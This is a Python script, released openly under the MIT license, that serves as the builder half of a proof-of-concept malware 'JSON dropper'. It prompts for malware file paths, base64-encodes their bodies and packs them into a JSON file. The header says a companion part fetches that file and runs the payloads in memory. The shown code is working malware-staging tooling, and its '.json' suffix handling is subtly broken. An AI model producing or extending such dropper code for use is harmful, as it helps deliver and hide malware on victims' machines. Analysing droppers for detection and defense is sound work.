##############################################################################
# Offline Py-JSON-Dropper - create_json - Python Script
# Description: A POC for JSON dropper(drop by fetching API JSON). It will ask for malware path and create a new json file with encode malware bodies, 
# for final it will execute the malware based on the extention(ps1/sh/java/python) using in memory execution.
# Author: Dor Dahan
# License: MIT (See details in the LICENSE file or at the end of this script)
##############################################################################

import base64, json

class Creator:
    def __init__(self) -> object:
        """
        Initialize the basic variables
        """
        self.final_json = {}
        self.names = []

    def json_format(self, binary_file:str) -> None:
        """
        Will take the malware path, and get the binary text from the file.
        It will encode the text to dict and store it for later use.
        :param binary_file: The malware path.
        :return: None
        """
        with open(binary_file, "rb") as file:
            text = file.read()
        if "/" in binary_file:
            binary_file = binary_file.split("/")[-1]
        elif "\\" in binary_file:
            binary_file = binary_file.split("\\")[-1]
        self.names.append(binary_file)
        encoded = base64.b64encode(text)
        encoded = encoded.decode('utf-8')
        self.final_json[binary_file.split(".")[0]] = {"body": encoded, "fullName": binary_file}

    def save_json(self, file_name:str) -> None:
        """
        Save the dict to a json format file
        :param file_name: The json file name
        :return: None
        """

        with open(file_name, "w") as file:
            json.dump(self.final_json, file, indent=4)


def main():
    """
    The user-interface and main function, it will get the malware names and
    get them to base64 encode of the malware body, for final insert the dict to json file
    :return: None
    """
    json_file = Creator()
    end = False
    files = []
    # Get the malware names
    while not end:
        user_file = input("Enter the malware file path[for exit press no]:")
        if user_file.lower() == "no":
            end = True
        else:
            files.append(user_file)
    # Transfer the malware body to encode and insert them to json format(dict)
    for file in files:
        json_file.json_format(file)
    # Choose a name for the json file
    name = input("Choose a name to the file: ")
    if ".json" in name:
        name.strip(".json")
    # Save the dict to the json file
    json_file.save_json(f"{name}.json")
    print(f"Done! You can see the json format in {name}.json")


if __name__ == '__main__':
    main()

# License Information
# This script is open-source and released under the MIT License.
# MIT License
# Copyright (c) 2023 Dor Dahan
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# For more details, see the LICENSE file in the root directory of this repository
# or visit https://github.com/D0rDa4aN919/Py-JSON-Dropper.
